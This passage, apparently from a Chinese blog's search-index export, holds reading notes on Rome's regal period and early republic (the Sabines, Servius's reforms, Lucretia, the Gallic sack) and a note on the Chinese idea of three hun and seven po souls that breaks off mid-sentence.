<p>​	早期的罗马人口结构失衡，男多女少。为了种族的延续，罗马的男人在罗穆路斯带领下，决定想办法抢隔壁村萨宾人的女人。</p>
<p>​	他们举办了一场大宴会，不少<strong>萨宾人</strong>拖家带口来参加盛宴。</p>
<p>​	就在大家享受美食之际，罗穆路斯突然令手下对萨宾人尤其是他们的女人下手。</p>
<p>​	700多萨宾女人被绑到罗马，后来成为罗马人的妻子。</p>
<p>​	萨宾人与罗马之间数次交战，各有胜负。</p>
<p>​	就在双方又要爆发新一次的战争之际，这时，被罗马人抢走的女人们站了出来劝双方和解。因为这时候早就已经生米煮成熟饭了，大家都是亲戚了。双方首领也意识到，与其刀戈相向，不如和睦相处。于是<u>罗马人与萨宾人从此合并</u>。</p>
<p>​	王政早期，罗马社会是一种依托血缘关系的氏族社会。包括三个部族，分别是拉丁人、埃特鲁里亚人和萨宾人。</p>
<p>​	每个部族又包括十个胞族（Curia）又称库里亚。每个胞族又包括十个氏族（Gentes）。</p>
<p>​	其中氏族的头领、贵族在一起议事，就形成了长老议事会，或者称<strong>元老院</strong>。</p>
<p>​	也就是说，这三个部族、三十个胞族和三百个氏族，组成了最初的罗马公民。</p>
<p>​	在这种体系之下，罗马的国家管理机构分别是勒克斯（Rex）/王、长老议事会/元老院和库里亚大会</p>
<p>​	其中，勒克斯就是国王。</p>
<p>​	“国之大事，在祀与戎”。罗马也不例外。</p>
<p>​	国王掌管军政、司法、宗教大权，由选举产生，不能世袭。</p>
<p>​	<em>库里亚大会</em>由全体氏族的成年男子参加，负责处理国家事务中的重大问题。有选举国王、宣战议和、对法案和死刑的表决权，但是没有提案的权力。</p>
<p>​	长老议事会有权提前讨论库里亚大会的重大问题和审查库里亚大会上表决通过的国王提案，拥有否决权。</p>
<p>​	由于其成员大多出自贵族，所以长老议事会对国家的事务决策具有很大影响力</p>
<p>​	罗马的王政时期一般认为有<u>七个王</u>，分别是罗穆路斯、努玛、图努斯、安库斯、老塔克文、塞尔维乌斯和小塔克文。</p>
<p>​	在前五位王的指引下，罗马城有了一定的扩张，吸纳了周围越来越多的外族人，人口也越来越多。</p>
<p>​	这些新进外族与旧有的三百个氏族之间自然会产生矛盾。</p>
<p>​	此时，罗马的旧治理体系不能适应社会的这种变化。所以，在第六位王<strong>塞尔努乌斯</strong>（578-534 BC）的执政时期，对罗马的军事和政治进行了一系列<em>改革</em>。</p>
<p>​	他推行人口和财产普查，按照财产多少划分居民的等级。不同的等级有不一样的权力和义务。</p>
<p>​	比如处于第一等级的富豪们要负责组成80个重装步兵百人队，18个骑兵百人队，武器自备；而 处于不入流最低等级的无产者们（第六级）只需要组成1个轻装步兵百人队。</p>
<p>​	在百人队的基础上，塞尔维乌斯建立了新的国家机构——百人队大会，又称<em>森都利亚大会</em>，负责处理宣战、选举、审判重大案件等重要事务。</p>
<p>​	可以发现，森都利亚大会与库里亚大会的权力重叠。</p>
<p>​	实际上，在改革之后，库里亚大会曾经的政治地位被森都利亚大会逐渐取代。</p>
<p>​	区别是，森都利亚大会表决时，每个百人队只有一票。其中，第一等级的富有者，合计98票，而后五个等级全加起来也才95票。</p>
<p>​	也就是说，改革后的罗马权力从库里亚大会的旧氏族人民参政制度转变为富有者统治、有产者参政的制度，而无产者被剥夺了参政权。</p>
<p>​	另外，塞尔维乌斯还将罗马城划分为四个区。</p>
<p>​	凡征兵、税收等事务都不再以旧有的三个部族为依据，而是以四个区为准。</p>
<p>​	塞尔维乌斯改革打破了旧氏族血缘社会时期贵族与平民的界限。因为此时富有的平民即使没有显赫的家世，也可以参政议政。</p>
<p>​	他建立了<u>以财产为划分标准的阶级关系</u>。这是<u>罗马从氏族社会向国家转变的关键步骤</u>。</p>
<p>​	因此，<em>塞尔维乌斯改革是罗马国家形成的标志</em>。</p>
<p>​	公元前535年，罗马王政时代的第七位国王<strong>小塔克文</strong>登基，他是第五位王老塔克文的儿子，据说他是靠暗杀塞尔维乌斯而夺取王位的。执政期间独断专行、厉行暴政。</p>
<p>​	公元前510年，国王塔克文在外征战，塔克文派他的儿子<strong>塞斯图斯</strong>前往科拉提亚。在科拉提亚，塞斯图斯受到了另一位王氏宗亲<strong>克拉第努斯</strong>的热情接待。</p>
<p>​	克拉第努斯有一个以忠贞贤惠而闻名的妻子，名叫<strong>鲁克丽丝</strong>。</p>
<p>​	一天，塞斯图斯和克拉第努斯在军营里聚餐吃饭。他们比谁的妻子更好、更贤惠，两人谁都不服谁。</p>
<p>​	夜里两个前往各自妻子的营帐，只有鲁克丽丝在勤劳地织布。夜里，当众人都回到营地后，塞斯图斯见色起意又溜了回来，并偷偷潜入鲁克丽丝的卧室。</p>
<p>​	第二天，鲁克丽丝穿了一身黑，来到父亲和丈夫面前跪求他们原谅，她一五一十的把昨晚被迫的事情描述了一遍。她对众人说，一定要报仇，虽然对方是当今的王子，也绝不能草草了事。</p>
<p>​	在场的人议论纷纷，就在大家讨论这件事怎么办的时候，鲁克丽丝不甘受辱，她突然拔出匕首，自杀以正清白。</p>
<p>​	克拉第努斯看到倒在血泊中的妻子，悲痛欲绝。众人一边对鲁克丽丝心生怜悯，一边对当权者的无道充满愤恨。</p>
<p>​	这时，克拉第努斯的朋友<strong>布鲁图斯</strong>捡起了那把带血的匕首，对神发誓，暴君不除，绝不生还。</p>
<p>​	她带着鲁克丽丝的尸体，来到罗马广场上，向民众宣告着王室的暴行。他的一番演讲，将民众心中久久积压的怒火转变为反抗压迫的力量。</p>
<p>​	他们联合起来，组建军队。公元前509年，推翻了国王塔克文的统治。</p>
<p>​	革命者为罗马建立了一个新的政治制度——<em>共和制</em>。民众推举布鲁图斯和克拉第努斯为执政官。</p>
<p>​	<u>历时240多年的罗马王政时代结束（753-509BC），从此开始了罗马共和国时代</u>。</p>
<ul>
<li>
<p>相关阅读：莎士比亚《鲁克丽丝受辱记》</p>
<ul>
<li>
<p>原文！写的真入微</p>
</li>
<li>
<p><a href="https://www.diyifanwen.com/sicijianshang/mingjiaaiqingshi/221844869_7.html">莎士比亚诗选-鲁克丽丝受辱记 (diyifanwen.com)</a></p>
</li>
</ul>
</li>
</ul>
<h3 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h3>
<p>当时看完这p去搜了莎士比亚写的这首诗。看完……还没看完，就觉得好长、好长啊……当然莎士比亚这个文笔也真的是山路十八弯九曲回肠的非常婉转诗意啊</p>
]]></content>
      <categories>
        <category>文史哲</category>
        <category>世界史</category>
        <category>罗马史</category>
      </categories>
      <tags>
        <tag>reading</tag>
        <tag>世界史</tag>
        <tag>罗马史</tag>
      </tags>
  </entry>
  <entry>
    <title>【从城邦到帝国】2_北蛮入侵_罗马危机</title>
    <url>/2024/07/06/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%96%E7%95%8C%E5%8F%B2/%E7%BD%97%E9%A9%AC%E5%8F%B2/%E3%80%90%E4%BB%8E%E5%9F%8E%E9%82%A6%E5%88%B0%E5%B8%9D%E5%9B%BD%E3%80%912_%E5%8C%97%E8%9B%AE%E5%85%A5%E4%BE%B5_%E7%BD%97%E9%A9%AC%E5%8D%B1%E6%9C%BA/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p><a href="https://www.bilibili.com/video/BV1wd4y1h7pP/?spm_id_from=333.999.0.0&amp;vd_source=3f0983ef34615b702fec513c41e55a64">视频地址</a>   是之前很喜欢练习打字（×的一段时间，看视频然后一个个字打下来的，当时视频说一句话我打一句，一个二十分钟的视频得看两倍时间，现在想来还真是降低开发效率的一些操作（捂脸）  都存在幕布那边，这回一次性整理一下</p>
<h3 id="北蛮入侵-罗马危机"><a class="header-anchor" href="#北蛮入侵-罗马危机">¶</a>北蛮入侵 罗马危机</h3>
<p>公元前509年，罗马人在布鲁图斯和克拉第努斯的带领下推翻国王，以此为起点，直到公元前27年，元老院授予<strong>屋大维</strong>“奥古都斯”称号为止的这四百八十二年间，称<u>罗马共和国</u>。</p>
<p><u>两条主线</u></p>
<p><em><strong>一  平民与贵族的斗争  使罗马的各项制度趋于完善</strong></em></p>
<p><em><strong>二  大规模的对外扩张  使罗马确立地中海霸权</strong></em></p>
<p>自从布鲁图斯和克拉第努斯推翻王政后，元老院同意从贵族中推选两名<strong>执政官</strong>，以代替原来的国王治理国家。</p>
<p>这两人权力相等，彼此制衡，且执政官的任期只有一年，卸任后自然回归元老院，国家将再度选举新执政官（老执政官依然可能再度当选）。</p>
<p>当国家处于战争等非常时期，为了确保权力集中，以处理国是，将由元老院推举<strong>独裁官</strong>。</p>
<p>这个独裁官可能是执政官，也可能是其他元老中的某一位。</p>
<p>罗马共和国为了避免独裁官权力过于膨胀，又规定独裁官只能任职六个月。如果任期将满，而国家仍处于非常时期，则由元老院再行选举，老独裁官也可能会连任。</p>
<p>此外罗马还完善其他官制，比如<strong>保民官</strong>、<strong>市政官</strong>之类。</p>
<p>共和之初的罗马强邻环伺，只是亚平宁半岛上众多国家或部落中的一个小国。</p>
<p>在她的背面是意大利最强大的埃特鲁里亚人，南面是沃尔西人、萨莫奈人、希腊人等，生存环境十分恶劣。</p>
<p>共和国最初的一百多年，罗马人就是在不断的和近邻的战斗中度过的。</p>
<p>公元前五世纪下半叶，罗马人在与沃尔西人的较量中转入优势。与此同时，罗马人与埃特鲁里亚人之间也爆发战争。</p>
<p>距离罗马城东北方向十二英里处有一座埃特鲁里亚人的重镇<em>维爱城</em>。早在王政时期，双方就因为水源、土地、盐、奴隶等各种原因经常打仗。</p>
<p>公元前479年，罗马对<em>维爱战争</em>中失利；公元前430年，罗马人扳回一局；</p>
<p>公元前405年，罗马再次进军，意图吞并维爱（Veii）。而这次出兵先后持续了10年。直到公元前396年，罗马执政官<strong>卡米卢斯</strong>（Camillus）夺取城池。</p>
<p>经过三次<u>维爱战争</u>，罗马的<em>埃特鲁里亚之患</em>从此消失，其势力也从拉丁平原扩张到意大利北部。</p>
<p>这场战争也是<u>罗马开始对外征服的标志</u>。</p>
<p>罗马在被征服的城市建立殖民地，和被征服者订立盟约，并排遣自己人去监督和统治这些地方，进而形成了自治、半自治或同盟关系。</p>
<p>公元前391年，一支<em>高卢</em>人部落（赛农人Senone）在布伦努斯的率领下从北意大利沿着亚德里亚海岸一路摧枯拉朽，十分骁勇。</p>
<p>攻打至埃特鲁里亚的克鲁西姆城时（今：Chiusi），克鲁希姆告急，向罗马求援。</p>
<p>罗马元老院向这支高卢人部落派遣了三个使臣，勒令停战，结果在谈判席上，双方进行了一波不太友好的交谈，两方人打了起来。</p>
<p>期间，罗马使者还杀了一个高卢的小头目。遭受奇耻大辱的高卢人在几天后便排遣大军杀向罗马</p>
<p>公元前390年，两军在距离罗马城北16公里外的阿里亚小河交战（Battle of the Allia）。</p>
<p>高卢人突然兵临城下，令罗马人十分惊讶，以至于罗马军几乎没有时间搭建营地和防御工事就匆匆投入战场。</p>
<p>为了避免被全歼，罗马军将战线拉长，并分兵排遣一支部队驻扎在军阵右侧的小山上。</p>
<p>高卢首领布伦努斯察觉到罗马人的动向，他担心一旦两军交战，罗马的右翼会从己方军阵的后方发起袭击，届时恐于己不利，于是他直接命令手下向罗马军右翼率先发起进攻。</p>
<p>罗马军左翼部队紧急向右军靠拢，而高卢军早已杀入军阵，拦住左翼去路，双方陷入混战。</p>
<p>可能是因为高卢人的剑比罗马人的长，使得战斗中的罗马人全线劣势，军心大乱。渐渐的越来越多的人在恐慌之中四处逃窜，左翼撤往维爱，右翼撤往罗马。</p>
<p>而高卢人对于这场轻而易举取得的胜利感到十分震惊。处理完战场后，他们集结军队继续向罗马城进发。</p>
<p>此时，罗马败退的军队大多数已经逃往维爱，少部分逃到罗马，而那些逃到罗马的人认为自己力量弱小，根本不是高卢人的对手，固守城池等于必死无疑。</p>
<p>于是，他们中的青壮年带着给养退守卡皮托尔山，只留下了少数妇孺老人（包括一些元老）在城市中。</p>
<p>当高卢大军抵达罗马城下时，发现城门大开，无人看守，顿时就起了疑心。</p>
<p>为了避免意外，高卢军很小心的在罗马与阿尼奥河之间扎营（今：Aniene River）。第二题，高卢人留下小队留守城门，剩下的大部队入城劫掠。他们进了城，发现街道上有一些路障，贵族的议事厅大门也是敞开的，城里异常的安静。就在他们以为这是个空城的时候，一个高卢人注意到几位衣着华丽的老者坐在不远处的走廊台阶上。他们面无表情，似乎内心毫无波澜。</p>
<p>高卢人走上去，仔细端详这几位一反常态的老者，并好奇地伸手去摸了摸其中一位老者长长的胡子。这时，老人举起手中的象牙拐杖，敲了下那个高卢人的头。而高卢人反手一刀索了他的命，余者亦无一幸免。</p>
<p>为了让那些逃至山中的罗马人回城救援他们的财物和亲人，高卢人放火烧城并大肆劫掠。</p>
<p>高卢军见罗马人没能中计，主动冲山。罗马军以逸待劳，加之居高临下，拼死抵抗，化解了高卢人的数次进攻。</p>
<p>高卢人见攻山不利，于是在山脚下布阵，将山上的罗马人全部包围。</p>
<p>此前逃到维爱城的罗马军也重新集结起来，他们将维爱城中的埃特鲁里亚奴隶充军，加上拉丁同盟的支持，军队恢复些许元气。随后在元老院的批准下，将此前被驱逐的前执政官<strong>卡米卢斯</strong>召回并任命为<strong>独裁官</strong>。卡米卢斯带领军队向罗马进发。</p>
<p>在卡皮托尔山下，高卢人打探到一条上山小道，于是高卢军悄悄上山意图偷袭罗马人。眼看着就要接近罗马营地时，一只**<u>大鹅</u>**突然嘎嘎大叫，罗马人惊醒，将高卢人击退。随后的日子里，双方一直僵持不下。</p>
<p>高卢军营内出现疟疾，不少士兵倒下。高卢人派使者找罗马人谈判，但罗马指挥官得知援军正在赶来的路上，于是拒绝，但士兵挨饿。随后双方经过谈判，罗马同意支付一千磅黄金。</p>
<p>在交付的时候，高卢人故意用一个不准的秤去称黄金，罗马人十分恼怒上前交涉。这时，高卢首领布伦努斯将剑丢到了秤的另一头。罗马人迫于形势，也只好忍着屈辱去搬更多的黄金放在秤上。</p>
<p>就在这个添黄金的关头，维爱的援军在卡米卢斯的率领下终于赶到罗马。双方无法谈拢，只能再次开战（BC 390-BC 387），此次交战，罗马取得大胜，高卢军惨败而逃。</p>
<p>这段故事由<strong>李维</strong>（Titus Livius）记载。其他史书还有不同记载，比如高卢人向罗马人勒索赎金之后便撤军走了。由于年代久远，历史学家对这些记载的真实性持不同观点。</p>
]]></content>
      <categories>
        <category>文史哲</category>
        <category>世界史</category>
        <category>罗马史</category>
      </categories>
      <tags>
        <tag>reading</tag>
        <tag>世界史</tag>
        <tag>罗马史</tag>
      </tags>
  </entry>
  <entry>
    <title>【中国神话-冥界篇】1_三魂七魄</title>
    <url>/2024/07/07/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%AD%E5%9B%BD%E5%8F%B2/%E4%B8%AD%E5%9B%BD%E7%A5%9E%E8%AF%9D/%E5%86%A5%E7%95%8C%E7%AF%87/%5B%E4%B8%AD%E5%9B%BD%E7%A5%9E%E8%AF%9D-%E5%86%A5%E7%95%8C%E7%AF%87%5D-1-%E4%B8%89%E9%AD%82%E4%B8%83%E9%AD%84/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>[视频地址](<a href="https://www.bilibili.com/video/BV1yA411V7ko/?spm_id_from=333.337.search-card.all.click&amp;vd_source=3f0983ef34615b702fec513c41e55a64">[中国神话-冥界篇 合集]中国古代魂魄观念大盘点！让你理清中国人的灵魂观！_哔哩哔哩_bilibili</a>)    感觉自分乃亚文化爱好者HHH</p>
<h3 id="冥界篇-1"><a class="header-anchor" href="#冥界篇-1">¶</a>冥界篇 1</h3>
<ul>
<li>
<p>由于中国人喜欢记录历史，神话人物大部分以历史人物为雏形衍生的，例如三皇五帝就是以部落或者部落首领的名字来创作的神话。</p>
</li>
<li>
<p>中华民族还有着楚国屈原记录的《九歌》神话。</p>
<ul>
<li>
<p>在九歌之中，东皇太一是至高主神；</p>
</li>
<li>
<p>而在《山海经》中，则以女娲、帝俊为主神；</p>
</li>
<li>
<p>盘古开天的神话却要直到三国时期由徐整所著的《三五历纪》中才出现，比在战国时期的《山海经》雏形要晚了几百年。</p>
</li>
</ul>
</li>
<li>
<p>十几代人的时间差使得中国神话主神与诸神的关系模糊不清，再加上道教、佛教、儒家思想对于神话的梳理与编纂，中国神话的主要脉络很难梳理。</p>
</li>
<li></li>
<li>
<p>传说商朝人好鬼神，每逢有战事或国家大事，帝王都会去往祖陵或祭台由祭司进行占卜。最为主流的占卜是将龟甲打磨抛光之后，由祭司投入紫荆木点燃的火焰之中，以龟甲之上的裂痕来判断吉凶，并以吉凶来判断接下来人们该怎样行事。这里的占卜出的结果，就是上天和鬼神们所给人的答案。</p>
</li>
<li>
<p>“社稷大事，唯祀与戎”</p>
</li>
<li>
<p>但随着时间的流逝，这一类的占卜之术逐渐的失传，变为了其他形式。</p>
</li>
<li>
<p>到了汉朝时，帝王独尊儒术，圣人孔子不说鬼神。此时，对于鬼神的解释之权落到了道家的手中。道家以老子学说，结合阴阳五行，乾坤八卦思想，再加上古人对于天地自然的观测与想象，这才衍生出了三魂七魄的观念。</p>
</li>
<li>
<p>这个观念之所以能保留下来，也是因为皇权与儒家选择的结果。中国人敬拜祖先，因此还有了清明节和中元节这一类祭奠逝者的节日。</p>
</li>
<li>
<p>在三魂七魄的观念未出现之前，不说鬼神的儒家一直无法解释大家到底在祭拜什么。直到三魂七魄观念的出现，才打破这一僵局。</p>
</li>
<li></li>
<li></li>
<li>
<p>三魂，分别是天魂胎光、地魂爽灵、人魂幽精。</p>
</li>
<li>
<p>传说在人没有出生之前，人魂由神明专司保管。当人体形成，人魂就会进入到肉体之中，此时，天地阴阳之精气也会形成人的魂魄，从而辅助人魂的成长。随着人本身的成长，天地人三魂也会有着同样的记忆、行为与性格。</p>
</li>
<li></li>
<li>
<p>一个传说之中的故事：明太祖朱元璋有一次被一个冒失的太监吓了一跳，于是命人将太监拖出去斩首，当时这个太监吓得面无血色。在斩首之时，人们惊讶的发现，斩首台之下竟然有一个长的和太监一模一样的人在那里看热闹。在太监被斩首的前一刻，朱元璋又下旨赦免了这个太监。也是这一吓，将太监的一个魂吓掉了，幻化出来另一个一模一样的自己并较有兴致的观看自己被斩首。</p>
</li>
<li>
<p>而在人死后，天魂和地魂的精气会再度回归到天地之中。丧失本源精气的这两个魂，一个会守护在自己的尸身旁边，一个会去到子孙后代供奉的牌位之中，接受子孙的敬拜与祭祀，而人魂则会被专司灵魂的神明拘走，从而为自己生前的善果和恶行负责；依附在尸身与牌位旁的魂，会像是一个监视器一样在灵位与坟墓旁边观看子孙的言行，观察子孙是否遵纪守法，心向善而不作恶，并保佑这些子孙健康的成长</p>
</li>
<li>
<p>这套说法之所以能够大面积地流行，很大原因取决于儒家接受了三魂这一设定，认为人每当清明节祭祀祖先的时候，都是在祭祀祖先肉体死亡后留下来的那个魂（此处可以指先祖的精神）</p>
</li>
<li>
<p>但对于祖先的祭祀也有规矩：先祖们只能够接受自己直系血脉的祭祀。这个观点来自于古代人对血缘观念的认识。</p>
</li>
<li>
<p>民间也有流传这样一个传说故事：据说一个地方的县太守手下有一个异人，这个人天生可以看到各家祖先的祭祀情况，县太守便命此人观察自家祭祀香火情况。当县太守的儿子为自家祖先上香之后，这个人却说他看到一个屠夫模样的魂进入到太守的祖庙大吃大喝，而旁边穿着官服的县太守本家的祖先，却饿的瘦骨嶙峋在家庙前徘徊。县太守于是逼问妻子，才得知当年生的是女儿，与屠夫家的女人换了孩子。</p>
</li>
<li>
<p>由这个故事可见中国文化中对直系子孙的重视，因此还产生了“不孝有三，无后为大”的言论。虽然故事中由重男轻女的陈腐观念，但也可以从中看出鬼神文化对古人生活的影响。</p>
</li>
<li>
<p>在<strong>道家</strong>系统中，三魂是阳之所属，相对应的七魄则是阴所在。七魄各自都有名称，分别是尸狗、伏矢、雀阴、吞贼、非毒、除秽、臭肺。七魄各自负责人们的喜、怒、哀、惧、爱、恶、欲七种主要的情绪。</p>
</li>
<li>
<p>传说在平日里，都是由三魂来掌控七魄，致使七魄不敢为非作歹使人沉浸于情欲之中。但当三魂受到严重打击而衰弱之时，三魂无力掌控七魄，</p>
</li>
</ul>
]]></content>
      <categories>
        <category>文史哲</category>
        <category>中国史</category>
        <category>中国神话</category>
        <category>冥界篇</category>
      </categories>
      <tags>
        <tag>reading</tag>
        <tag>世界史</tag>
        <tag>中国神话</tag>
        <tag>冥界篇</tag>
      </tags>
  </entry>
</search>
